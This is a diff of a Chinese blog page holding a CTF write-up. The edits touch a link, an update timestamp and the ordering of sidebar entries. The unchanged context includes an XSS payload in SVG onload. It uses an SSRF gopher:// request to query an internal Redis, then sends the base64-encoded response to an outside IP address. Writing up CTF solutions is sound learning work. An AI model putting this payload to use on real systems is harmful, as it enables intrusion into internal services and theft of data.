@@ -614,7 +614,7 @@ height:50vh;
 <p>构造 payload 打下 Redis</p>
 <figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gopher://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">25566</span>/_info</span><br><span class="line"></span><br><span class="line">&lt;svg/<span class="attr">onload="</span></span><br><span class="line">var <span class="attr">x=new</span> XMLHttpRequest();</span><br><span class="line">x.<span class="attr">onreadystatechange=function()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (x.<span class="attr">readyState==4</span> &amp;&amp; x.<span class="attr">status==200)</span> &#123;</span><br><span class="line">        document.<span class="attr">location='http://47.101.220.241:9001/?code='+btoa(x.responseText);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">x.open(<span class="string">"POST"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">x.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">x.send(<span class="string">"url=gopher://127.0.0.1:25566/_info"</span>);</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>成功打到回显，看来就是未授权打 redis 了，其他的就是老套路了，具体利用方式见 <a href>博客</a>。</p>
+<p>成功打到回显，看来就是未授权打 redis 了，其他的就是老套路了，具体利用方式见 <a href="[https://wywwzjj.top/2019/05/17/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/](https://wywwzjj.top/2019/05/17/Redis-未授权访问相关利用/)">博客</a>。</p>
 
     </article>
     <!-- license  -->
@@ -623,7 +623,7 @@ height:50vh;
             <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
             </p><p>原文链接：<a href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/">https://wywwzjj.top/2019/02/02/Hackme-Writeup/</a>
             </p><p>发表日期：<a href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/">February 2nd 2019, 11:23:33 pm</a>
-            </p><p>更新日期：<a href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/">May 19th 2019, 8:07:06 pm</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/">May 19th 2019, 8:17:23 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -1317,12 +1317,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
         </li>
     
     
@@ -1376,12 +1376,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
         </li>
     
     
@@ -1433,9 +1433,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
-        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
-    
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
     
@@ -1443,19 +1443,19 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
-        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
-    
-        <span class="sidebar-tag-name" data-tags="总结"><span class="iconfont-archer">&#xe606;</span>总结</span>
-    
-        <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
-    
-        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
-    
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
         <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
+    
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="总结"><span class="iconfont-archer">&#xe606;</span>总结</span>
+    
+        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
